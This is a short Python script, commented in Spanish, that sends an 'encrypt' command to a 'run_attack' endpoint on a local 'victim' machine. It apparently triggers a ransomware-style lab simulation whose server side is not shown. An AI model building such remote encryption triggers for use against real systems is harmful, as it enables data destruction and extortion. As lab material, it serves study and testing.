import requests

VICTIM_IP = "10.74.10.88"  # IP de WSL en tu red
URL = f"http://{VICTIM_IP}:5001/run_attack"

print("[*] Enviando ataque...")
res = requests.post(URL, json={"action": "encrypt"})

print("Respuesta del servidor víctima:")
print(res.text)
